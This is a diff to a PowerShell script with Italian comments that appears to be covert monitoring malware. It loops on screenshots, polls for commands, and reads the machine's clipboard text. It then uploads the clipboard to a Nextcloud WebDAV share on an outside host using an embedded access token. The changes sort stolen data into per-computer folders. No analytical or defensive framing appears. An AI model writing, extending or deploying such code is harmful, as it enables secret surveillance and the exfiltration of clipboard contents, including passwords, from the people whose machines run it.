@@ -63,13 +63,20 @@ function Nextcloud-OpenFile {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
     $nextcloudUrl = "https://liv.nl.tab.digital/"
-	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
+	$fileUrl = "$nextcloudUrl/public.php/webdav/"
 
     $headers = @{
 		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
 		"X-Requested-With"="XMLHttpRequest";
 	}
 
+	try {
+		Invoke-RestMethod -Uri "$fileUrl/$env:computername" -Headers $headers -Method Head -ErrorAction SilentlyContinue
+		$fileUrl += "$env:computername/$fileName"
+	}
+	catch {
+		$fileUrl += "$fileName"
+	}
 	try{
 		Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
 	}
@@ -350,7 +357,6 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 		if($command[1] -ne 0 -and $command[1] -ne "" -and $repeatCode -eq ""){
 			$repeatCode = $command[1]
 		}
-
 		# controllo quante volte deve essere eseguito ancora il comando
 		if($command -ne "" -and $command[1] -ne 0 -and $command.Count -gt 1){
 			if($repeatCode -cge 1){
@@ -421,14 +427,14 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 		$date = (Get-Date).ToString("dd/MM/yyyy")
 		$time = (Get-Date).ToString("HH:mm:ss")
 
-		$cloudfileContent = Nextcloud-OpenFile -FileName "clipboard.txt" -AccessToken $AccessToken # contenuto del file caricato sul cloud
+		$cloudfileContent = Nextcloud-OpenFile -FileName "$env:computername-clipboard.txt" -AccessToken $AccessToken # contenuto del file caricato sul cloud
 		$clipboardContent = [System.Windows.Forms.Clipboard]::GetText() # nuovo contenuto del file
 
 		$fileContent += $cloudfileContent
 		$fileContent += "# ===== $date - $time ============================== #"
 		$fileContent += "$clipboardContent`n"
 
-		$outputFile = Join-Path $PSScriptRoot "$env:computername-clipboard.txt"
+		$outputFile = "$PSScriptRoot\$env:computername-clipboard.txt"
 
 		$fileContent | Out-File -FilePath $outputFile -Encoding UTF8
 		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
@@ -487,11 +493,12 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 				$p1   = [System.Windows.Forms.Cursor]::Position
 				$temp = 0
 			}
-
 		}
-
 		$n += 1
 		$temp += $config.Interval
-		Start-Sleep -Seconds $config.Interval
 	}
+
+	# ===================================================================================================================== #
+
+	Start-Sleep -Seconds $config.Interval
 }
